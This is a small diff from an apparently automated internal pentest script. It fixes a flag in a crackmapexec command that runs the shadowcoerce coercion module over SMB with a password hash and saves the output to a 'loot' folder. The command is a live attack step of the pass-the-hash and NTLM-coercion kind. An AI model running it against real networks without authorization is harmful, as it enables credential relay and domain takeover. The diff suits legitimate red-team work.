@@ -252,7 +252,7 @@ if [ -z "$PASS" ]; then
   echo "Shadowcoerce" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
   # DFScoerce
-  crackmapexec smb "$IP" -u "$USER" --H "$HASH" -d "$DOM" -M shadowcoerce >>/root/output/loot/intern/rpc/shadowcoerce/shadowcoerce_"$FQDN".txt
+  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M shadowcoerce >>/root/output/loot/intern/rpc/shadowcoerce/shadowcoerce_"$FQDN".txt
 
   echo "Sessions" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
